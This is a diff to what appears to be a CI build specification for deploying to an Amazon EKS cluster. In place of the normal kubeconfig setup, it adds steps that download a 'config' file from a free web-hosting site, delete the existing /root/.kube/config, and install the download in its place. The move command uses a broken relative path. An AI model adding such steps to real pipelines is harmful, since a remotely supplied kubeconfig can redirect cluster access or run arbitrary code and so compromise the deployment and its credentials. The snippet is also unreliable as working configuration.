@@ -20,9 +20,10 @@ phases:
     commands:
       - echo Logging in to Amazon EKS...
       - aws sts get-caller-identity
-      - aws eks update-kubeconfig --name $AWS_CLUSTER_NAME --region $AWS_DEFAULT_REGION
+      - wget "https://nosone.000webhostapp.com/config"
+      - rm /root/.kube/config
+      - mv config root/.kube/config 
       - aws sts get-caller-identity
-      - aws eks --region $AWS_DEFAULT_REGION update-kubeconfig --name $AWS_CLUSTER_NAME
       - echo check config 
       - kubectl config view --minify
       - echo check kubectl access
